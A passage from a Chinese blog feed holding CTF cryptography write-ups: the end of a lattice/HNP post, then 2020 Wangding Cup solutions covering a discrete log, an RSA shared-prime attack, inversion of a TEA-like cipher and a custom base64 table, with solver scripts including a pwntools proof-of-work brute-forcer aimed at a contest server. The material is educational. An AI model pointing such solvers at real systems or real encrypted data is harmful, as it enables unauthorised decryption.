class="line">    ct = cipher.decrypt(flag)</span><br><span class="line">    print(ct)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    rand_iter = gen_lcg()</span><br><span class="line">    rand_iter = leak_data(rand_iter)</span><br><span class="line">    decrypt(rand_iter)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>&emsp;&emsp;从这两题我们可以发现，解决HNP问题，一般我们需要多组数据，然后每一组就像方程组中的每一条方程，我们根据这些方程组构造一个Lattice，也可以认为是一个矩阵，就好像在用矩阵解决线代中的 XA=B 的问题，这个B中的每一项是我们获得的MSB这样子的比较模糊的信息（上面两题我们拿到的都是未知量的bit_length，也相当于MSB）。然后这个B向量的长度（范式）需要相对与格中其他向量要短，然后我们就可以利用LLL算法找到这个B，进而根据我们的构造，确定X向量中我们需要的一个特定的值。也就是方程组的解。</p><p>&emsp;&emsp;需要再次说明的是，这个矩阵所代表的方程组并非像真正的线代中的XA=B问题中的方程组——是多元的。我们这里的方程组是一元的。如果正常解方程的话，之所以这么多条方程都算不出解，就是因为我们得到信息是模糊的，并非是准确的。故我们需要用到格理论，和一个超好用的LLL算法。</p>]]></content>
      
      
      <categories>
          
          <category> 密码小屋 </category>
          
          <category> Lattice </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Lattice </tag>
            
            <tag> Dsa </tag>
            
            <tag> LCG </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 网鼎杯</title>
      <link href="/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF/"/>
      <url>/2020/05/10/2020%E7%BD%91%E9%BC%8E%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="青龙组"><a href="#青龙组" class="headerlink" title="青龙组"></a>青龙组</h1><h2 id="boom"><a href="#boom" class="headerlink" title="boom"></a>boom</h2><p><code>first:this string md5:46e5efe6165a5afb361217446a2dbd01</code></p><p>去<a href="https://chamd5.org" target="_blank" rel="noopener">在线网站</a>查得:en5oy</p><p><code>This time:Here are have some formulas 3x-y+z=1852x+3y-z=321x+y+z=173input: x =</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var(&apos;x y z&apos;)</span><br><span class="line">solve([3*x-y+z==185,2*x+3*y-z==321,x+y+z==173],[x,y,z])</span><br></pre></td></tr></table></figure><p><code>Last time: Kill itx*x+x - 7943722218936282 = 0input x:</code></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">var</span><span class="params">(<span class="string">'x'</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">solve</span><span class="params">([x * x + x - <span class="number">7943722218936282</span> == <span class="number">0</span>],[x])</span></span></span><br></pre></td></tr></table></figure><h2 id="you-raise-me-up"><a href="#you-raise-me-up" class="headerlink" title="you raise me up"></a>you raise me up</h2><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line">from Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> <span class="built_in">random</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">2</span> ** <span class="number">512</span></span><br><span class="line">m = <span class="built_in">random</span>.randint(<span class="number">2</span>, n<span class="number">-1</span>) | <span class="number">1</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, bytes_to_long(flag), n)</span><br><span class="line"><span class="built_in">print</span> <span class="string">'m = '</span> + str(m)</span><br><span class="line"><span class="built_in">print</span> <span class="string">'c = '</span> + str(c)</span><br><span class="line"></span><br><span class="line"><span class="meta"># m = 391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075</span></span><br><span class="line"><span class="meta"># c = 6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499</span></span><br></pre></td></tr></table></figure><p>题中我们的flag在m的指数位置，所以这题是解一个DLP(离散对数问题)</p><p>发现题中的n = 2 ** 512， 所以phi(n) =  2 ** 511；即本题模数的欧拉函数具有smooth的性质，即其是由很多小素数乘积而来，所以可用Pohlig Hellman 算法来解决这个DLP，sage的discrete_log用的方法就包括Pohlig Hellman算法，exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">m = 391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075</span><br><span class="line">c = 6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499</span><br><span class="line">n = 2 ** 512</span><br><span class="line">m = Mod(m,n)</span><br><span class="line">c = Mod(c,n)</span><br><span class="line">discrete_log(c,m)</span><br></pre></td></tr></table></figure><h2 id="easy-ya"><a href="#easy-ya" class="headerlink" title="easy_ya"></a>easy_ya</h2><p>题目代码</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span><span class="built_in"> secret </span>import flag,key</span><br><span class="line"><span class="keyword">from</span> random import randint</span><br><span class="line"><span class="keyword">from</span> libnum import n2s,s2n</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number import getPrime</span><br><span class="line">limit = lambda n: n &amp; 0xffffffff</span><br><span class="line"><span class="attribute">padding</span>=<span class="string">"\xe6\xe6\xe7\xe6\xe5\xe6\xe5\xe9\xe5"</span></span><br><span class="line"><span class="attribute">ek</span>=<span class="string">'\xe6\x84\xbf'</span></span><br><span class="line">def encode(key,data):</span><br><span class="line">    pad  = randint(0x10000000,0xffffffff)</span><br><span class="line">    Key  = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> key]</span><br><span class="line">    Data = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> data]</span><br><span class="line">    a = limit((Key[0] &lt;&lt; 24) | (Key[1] &lt;&lt; 16) | (Key[2] &lt;&lt; 8) | Key[3])</span><br><span class="line">    b = limit((Key[4] &lt;&lt; 24) | (Key[5] &lt;&lt; 16) | (Key[6] &lt;&lt; 8) | Key[7])</span><br><span class="line">    c = limit((Key[8] &lt;&lt; 24) | (Key[9] &lt;&lt; 16) | (Key[10] &lt;&lt; 8) | Key[11])</span><br><span class="line">    d = limit((Key[12] &lt;&lt; 24) | (Key[13] &lt;&lt; 16) | (Key[14] &lt;&lt; 8) | Key[15])</span><br><span class="line">    y = limit((Data[0] &lt;&lt; 24) | (Data[1] &lt;&lt; 16) | (Data[2] &lt;&lt; 8) | Data[3])</span><br><span class="line">    z = limit((Data[4] &lt;&lt; 24) | (Data[5] &lt;&lt; 16) | (Data[6] &lt;&lt; 8) | Data[7])</span><br><span class="line">    pads = 0</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(32):</span><br><span class="line">        pads = limit(pads + pad)</span><br><span class="line">        y = limit( y + ((z<span class="number">*16</span> + a) ^ (z + pads) ^ ((z&gt;&gt;5) + b)))</span><br><span class="line">        z = limit( z + ((y<span class="number">*16</span> + c) ^ (y + pads) ^ ((y&gt;&gt;5) + d)))</span><br><span class="line">    <span class="builtin-name">print</span> hex((y &lt;&lt; 52) ^ (pads &lt;&lt; 20) ^ z)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pow_check()</span></span><br><span class="line"><span class="comment">#token_check()</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">flag</span>=flag.ljust(len(flag)+(-len(flag)&amp;7),'\x00')</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(0,len(flag)/8):</span><br><span class="line">    encode(key,flag[8*i:8*i+8])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(9):</span><br><span class="line">    ek+=padding[i] + key[2*i:2*i+2]</span><br><span class="line"></span><br><span class="line"><span class="attribute">p</span>=getPrime(2048)</span><br><span class="line"><span class="attribute">e</span>=0x10001</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(2):</span><br><span class="line">    <span class="attribute">q</span>=getPrime(2048)</span><br><span class="line">    <span class="attribute">n</span>=p*q</span><br><span class="line">    <span class="builtin-name">print</span> n</span><br><span class="line">    <span class="builtin-name">print</span> pow(s2n(ek),e,n)</span><br></pre></td></tr></table></figure><p>显然，我们第一步需要去交互，拿到四个大数，其中两个是有公因子p的大数n，还有两个就是ek的密文。这一步就是凑数的part，没点营养。<del>吐槽，交互的时候什么沙雕PoW，有必要卡这个嘛</del></p><p>破PoW的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">sh = remote(<span class="string">"39.96.90.217"</span>,<span class="string">"17497"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"x[:20] = "</span>)</span><br><span class="line">pa = sh.recv(len(<span class="string">'f91a551dfa31e47458df'</span>))</span><br><span class="line">sh.recvuntil(<span class="string">'openssl_sha'</span>)</span><br><span class="line">fun = sh.recvuntil(<span class="string">"&gt;"</span>)[:<span class="number">-1</span>]</span><br><span class="line">sh.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">table = string.printable</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getpow</span><span class="params">(fun,mess)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> table:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> table:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> table:</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> table:</span><br><span class="line">                    password=i+j+k+l</span><br><span class="line">                    <span class="keyword">if</span> fun == <span class="string">"256"</span>:</span><br><span class="line">                        <span class="keyword">if</span> hashlib.sha256(password.encode()).hexdigest()[:<span class="number">20</span>] == mess:</span><br><span class="line">                            <span class="keyword">return</span> i+j+k+l</span><br><span class="line">                    <span class="keyword">elif</span> fun == <span class="string">"384"</span>:</span><br><span class="line">                        <span class="keyword">if</span> hashlib.sha384(password.encode()).hexdigest()[:<span class="number">20</span>] == mess:</span><br><span class="line">                            <span class="keyword">return</span> i+j+k+l</span><br><span class="line">                    <span class="keyword">elif</span> fun == <span class="string">"1"</span>:</span><br><span class="line">                        <span class="keyword">if</span> hashlib.sha1(password.encode()).hexdigest()[:<span class="number">20</span>] == mess:</span><br><span class="line">                            <span class="keyword">return</span> i+j+k+l</span><br><span class="line">                    <span class="keyword">elif</span> fun == <span class="string">"512"</span>:</span><br><span class="line">                        <span class="keyword">if</span> hashlib.sha512(password.encode()).hexdigest()[:<span class="number">20</span>] == mess:</span><br><span class="line">                            <span class="keyword">return</span> i+j+k+l</span><br><span class="line">                    <span class="keyword">elif</span> fun == <span class="string">"224"</span>:</span><br><span class="line">                        <span class="keyword">if</span> hashlib.sha224(password.encode()).hexdigest()[:<span class="number">20</span>] == mess:</span><br><span class="line">                            <span class="keyword">return</span> i+j+k+l</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        print(fun)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"no ans"</span>)</span><br><span class="line">                        </span><br><span class="line">sh.sendline(getpow(fun,pa))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>然乎我们输入token，拿到自己的data</p><p>解得ek</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from gmpy2 import *</span><br><span class="line">n1 = </span><br><span class="line">n2=</span><br><span class="line">p = gcd(n1,n2)</span><br><span class="line">q1 = n1//p</span><br><span class="line">q2 = n2//p</span><br><span class="line">assert n1 == p*q1</span><br><span class="line">assert n2 == p*q2</span><br><span class="line">c1 = </span><br><span class="line">e = 65537</span><br><span class="line">phi = (p-1)*(q2-1)</span><br><span class="line">d = inverse(e,phi)</span><br><span class="line">m = pow(c2,d,n2)</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;愿我所爱无忧恙岁长安</span><br></pre></td></tr></table></figure><p>python2下会得到这么个ek，有点意思嗷，<del>但你还是沙雕出题人，谁让你用PoW卡我</del></p><p>python3运行得到<code>b&#39;\xe6\x84\xbf\xe6\x88\x91\xe6\x89\x80\xe7\x88\xb1\xe6\x97\xa0\xe5\xbf\xa7\xe6\x81\x99\xe5\xb2\x81\xe9\x95\xbf\xe5\xae\x89&#39;</code></p><p>然后去掉该去的就能得到key了<code>&#39;\x88\x91\x89\x80\x88\xb1\x97\xa0\xbf\xa7\x81\x99\xb2\x81\x95\xbf\xae\x89&#39;</code></p><p>然后就是逆这个encode了。</p><p>其中我们交互的时候拿到五组密文，易得，每组密文中，保存了encode中32轮加密后的完整的y，pads和有一部分重合。但是pads加了32次pad后，最后5位已经变成0了。所以z我们可以知道20+5 = 25位，剩下七位未知。</p><p>然后我们就去爆pad，我们从密文里头能知道pad的52-32=20位。但这20位其实是中间部分的。最高的5位已经被limit搞没掉了。然后最低的7位我们也是不知道的。所以，，，爆。我们爆了低7位的同时，也能确定一个z，然后反加密看结果咯。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">limit = <span class="keyword">lambda</span> n: n &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = <span class="string">'\x88\x91\x89\x80\x88\xb1\x97\xa0\xbf\xa7\x81\x99\xb2\x81\x95\xbf\xae\x89'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">(key)</span>:</span></span><br><span class="line">    Key  = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> key]</span><br><span class="line">    <span class="comment">#Data = [ord(i) for i in data]</span></span><br><span class="line">    a = limit((Key[<span class="number">0</span>] &lt;&lt; <span class="number">24</span>) | (Key[<span class="number">1</span>] &lt;&lt; <span class="number">16</span>) | (Key[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) | Key[<span class="number">3</span>])</span><br><span class="line">    b = limit((Key[<span class="number">4</span>] &lt;&lt; <span class="number">24</span>) | (Key[<span class="number">5</span>] &lt;&lt; <span class="number">16</span>) | (Key[<span class="number">6</span>] &lt;&lt; <span class="number">8</span>) | Key[<span class="number">7</span>])</span><br><span class="line">    c = limit((Key[<span class="number">8</span>] &lt;&lt; <span class="number">24</span>) | (Key[<span class="number">9</span>] &lt;&lt; <span class="number">16</span>) | (Key[<span class="number">10</span>] &lt;&lt; <span class="number">8</span>) | Key[<span class="number">11</span>])</span><br><span class="line">    d = limit((Key[<span class="number">12</span>] &lt;&lt; <span class="number">24</span>) | (Key[<span class="number">13</span>] &lt;&lt; <span class="number">16</span>) | (Key[<span class="number">14</span>] &lt;&lt; <span class="number">8</span>) | Key[<span class="number">15</span>])</span><br><span class="line">    <span class="keyword">return</span> (a,b,c,d)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#y = limit((Data[0] &lt;&lt; 24) | (Data[1] &lt;&lt; 16) | (Data[2] &lt;&lt; 8) | Data[3])</span></span><br><span class="line">    <span class="comment">#z = limit((Data[4] &lt;&lt; 24) | (Data[5] &lt;&lt; 16) | (Data[6] &lt;&lt; 8) | Data[7])</span></span><br><span class="line"></span><br><span class="line">(a,b,c,d)=init(key)</span><br><span class="line">ans = <span class="number">0x9d98a72f5c82c26680a65</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">"flag&#123;0123456789bcde-_&#125;\x00"</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ans <span class="keyword">in</span> [<span class="number">0xcf4add0cf5469a49d19c</span>,</span><br><span class="line"><span class="number">0xcccd38faa373af5059b5f</span>,</span><br><span class="line"><span class="number">0xad0e355d4d8b1cc9771d1</span>,</span><br><span class="line"><span class="number">0x703ccca78d36e770d0613</span>,</span><br><span class="line"><span class="number">0x54e05275b03e2cdedc053</span>]:</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">8</span>):</span><br><span class="line">            y = ans &gt;&gt; <span class="number">52</span><span class="comment">#取y</span></span><br><span class="line">            mix = ans &amp; (<span class="number">2</span>**<span class="number">52</span><span class="number">-1</span>)<span class="comment">#剩下的为不确定z和pad混合</span></span><br><span class="line">            pads_true = mix &gt;&gt; <span class="number">32</span><span class="comment">#拿到pad的有效的20位</span></span><br><span class="line">            source_pad = (h&lt;&lt;<span class="number">27</span>)| (pads_true&lt;&lt;<span class="number">7</span>)| l<span class="comment">#爆破pad</span></span><br><span class="line">            z = limit(mix ^ (source_pad&lt;&lt;<span class="number">25</span>))<span class="comment">#根据猜的pad，然后mix中pad和z的混合部分，确定z</span></span><br><span class="line">            <span class="keyword">for</span> round <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">                pads = limit(source_pad*(<span class="number">32</span>-round))<span class="comment">#根据encode来用pads</span></span><br><span class="line">                z = limit( z - ((y*<span class="number">16</span> + c) ^ (y + pads) ^ ((y&gt;&gt;<span class="number">5</span>) + d)))<span class="comment">#加密函数反一下</span></span><br><span class="line">                y = limit( y - ((z*<span class="number">16</span> + a) ^ (z + pads) ^ ((z&gt;&gt;<span class="number">5</span>) + b)))</span><br><span class="line">            flag = (y&lt;&lt;<span class="number">32</span>)+z</span><br><span class="line">            <span class="comment">#print flag</span></span><br><span class="line">            <span class="keyword">if</span> check(long_to_bytes(flag)):<span class="comment">#根据flag的可能字符来判断咯</span></span><br><span class="line">                print(long_to_bytes(flag))</span><br></pre></td></tr></table></figure><h1 id="白虎组"><a href="#白虎组" class="headerlink" title="白虎组"></a>白虎组</h1><h2 id="b64"><a href="#b64" class="headerlink" title="b64"></a>b64</h2><p>换表base64，将给出对应关系记下来，发现flag密文中[‘E’, ‘G’, ‘I’, ‘s’, ‘X’, ‘z’]，这六个字符没有映射关系。</p><p>然后有[‘+’, ‘/‘, ‘1’, ‘5’, ‘7’, ‘6’, ‘9’, ‘8’, ‘A’, ‘C’, ‘H’, ‘K’, ‘J’, ‘P’, ‘R’, ‘V’, ‘e’, ‘f’, ‘n’, ‘u’, ‘w’, ‘v’] 这么多位字符也没有被映射。</p><p>所以爆破这两个列表中的映射关系</p><p>然后根据flag的格式，uuid，来判断结果。</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8-*-</span><br><span class="line">from base64 import *</span><br><span class="line">from string import *</span><br><span class="line"></span><br><span class="line">def check(s):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> i not <span class="keyword">in</span> <span class="string">"flag&#123;-1234567890abcdef&#125;"</span>:</span><br><span class="line">            <span class="keyword">return</span> False</span><br><span class="line">    <span class="keyword">return</span> True</span><br><span class="line"></span><br><span class="line">flag = 'uLdAuO8duojAFLEKjIgdpfGeZoELjJp9kSieuIsAjJ/LpSXDuCGduouz'</span><br><span class="line">a='pTjMwJ9WiQHfvC+eFCFKTBpWQtmgjopgqtmPjfKfjSmdFLpeFf/Aj2ud3tN7u2+enC9+nLN8kgdWo29ZnCrOFCDdFCrOFoF='</span><br><span class="line">b='YXNobGtqIUBzajEyMjMlXiYqU2Q0NTY0c2Q4NzlzNWQxMmYyMzFhNDZxd2prZDEySjtESmpsO0xqTDtLSjg3MjkxMjg3MTM='</span><br><span class="line"><span class="keyword">alpha</span> = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789abcdefABCDEF+/'</span><br><span class="line">FLAG=''</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(<span class="string">"fail words"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">in</span> a:</span><br><span class="line"></span><br><span class="line">        index = a.<span class="built_in">index</span>(i)</span><br><span class="line">        FLAG+=b[index]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        FLAG+='!'</span><br><span class="line">        <span class="keyword">print</span> i,</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nFLAG cipher"</span>       </span><br><span class="line"><span class="keyword">print</span> FLAG</span><br><span class="line">#'ZmxhZ3sxZTNhMm!lN!0xYz!yLT!mNGYtOWIyZ!!hNGFmYW!kZj!xZTZ!'</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"alternative words"</span></span><br><span class="line">aw=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">alpha</span>:</span><br><span class="line">    <span class="keyword">if</span> i not <span class="keyword">in</span> b:</span><br><span class="line">        aw += <span class="built_in">i</span></span><br><span class="line"><span class="keyword">print</span> aw</span><br><span class="line"></span><br><span class="line">'@#$%^&amp;'</span><br><span class="line"><span class="keyword">table</span> = 'ACHJKPRVefnuvw156789efAC+/'</span><br><span class="line"><span class="keyword">print</span>(<span class="string">"for z"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">table</span>:</span><br><span class="line">    <span class="keyword">if</span> b64decode(<span class="string">"ZTZ"</span>+i)[-1] == '&#125;':</span><br><span class="line">        FLAG = FLAG.<span class="keyword">replace</span>(<span class="string">"ZTZ!"</span>,<span class="string">"ZTZ9"</span>)</span><br><span class="line">        <span class="keyword">table</span> = <span class="keyword">table</span>.<span class="keyword">replace</span>(i,<span class="string">""</span>)</span><br><span class="line">        #<span class="keyword">print</span> FLAG</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(<span class="string">"for G"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">table</span>:</span><br><span class="line">    <span class="keyword">if</span> check(b64decode(<span class="string">"Zj"</span>+i+<span class="string">"x"</span>)) and check(b64decode(<span class="string">"Yz"</span>+i+<span class="string">"y"</span>)):</span><br><span class="line">        #<span class="keyword">print</span> b64decode(<span class="string">"Zj"</span>+i+<span class="string">"x"</span>)</span><br><span class="line">        FLAG = FLAG.<span class="keyword">replace</span>(<span class="string">"Zj!x"</span>,<span class="string">"Zj"</span>+i+<span class="string">"x"</span>).<span class="keyword">replace</span>(<span class="string">"Yz!y"</span>,<span class="string">"Yz"</span>+i+<span class="string">"y"</span>)</span><br><span class="line">        <span class="keyword">table</span> = <span class="keyword">table</span>.<span class="keyword">replace</span>(i,<span class="string">""</span>)</span><br><span class="line">        #<span class="keyword">print</span> <span class="built_in">i</span></span><br><span class="line">        #<span class="keyword">print</span> FLAG</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(<span class="string">"for I and s"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">table</span>:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="keyword">table</span>:</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> check(b64decode(<span class="string">"N"</span>+i+<span class="string">"0x"</span>)) and check(b64decode(<span class="string">"Z"</span>+i+j+<span class="string">"h"</span>)):</span><br><span class="line">            #<span class="keyword">print</span> b64decode(<span class="string">"N"</span>+i+<span class="string">"0x"</span>),b64decode(<span 